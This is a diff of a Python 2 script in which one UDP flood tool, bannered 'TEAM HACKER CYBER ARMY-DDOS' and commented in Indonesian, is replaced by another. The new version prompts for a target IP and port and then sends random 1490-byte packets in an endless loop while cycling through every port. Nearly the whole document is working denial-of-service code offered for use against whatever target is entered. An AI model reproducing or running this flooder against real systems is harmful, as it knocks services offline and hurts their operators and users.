@@ -1,1 +1,51 @@
-import time import socket import random import sys def usage(): print "\033[1;32m###########################################################" print "#------------------------[\033[1;91mTEAM HACKER CYBER ARMY-DDOS\033[1;32m]---------------------#" print "#-----------------------------------------------------------#" print "# \033[1;91mMenjalankan: " "python2 100juta.py " "<ip> <port> <packet> \033[1;32m #" print "# #" print "#\033[1;91m Creator:MRLINKERRORSYSTEM Pantangmundursebelumdown DDOS #" print "#\033[1;91m Team :LCI PANTANG MUNDUR SEBELUM #" print "#\033[1;91m Version:1.0 100 JUTA #" print "# #" print "# #" print "# \033[1;91m<--[TEAM HACKER CYBER ARMY]--> \033[1;32m#" print "###########################################################" print " @@@@@@@@@@" print " @@@@@@@@@@" print " @@@@@@@@@@@@@@@@" def flood(victim, vport, duration): # Support us yaakk... :) # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu menunjukkan UDP type program client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 20000 representasi satu byte ke server bytes = random._urandom(20000) timeout = time.time() + duration sent = 3000 while 1: if time.time() > timeout: break else: pass client.sendto(bytes, (victim, vport)) sent = sent + 1 print "\033[1;91mMulai \033[1;32m%s \033[1;91mmengirim hadiah \033[1;32m%s \033[1;91m100 juta pada target \033[1;32m%s "%(sent, victim, vport) def main(): print len(sys.argv) if len(sys.argv) != 4: usage() else: flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])) if __name__ == '__main__': main() 
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : MRLINKERRORSYSTEM"
+print "You Tube : https://m.youtube.com/channel/UCzsBNe-gFuzvqoZK1IdILXg"
+print "github   : github.com/mrlinkerrorsystem"
+print "Email : MRLINKERRORSYSTEM@Progammer.net"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
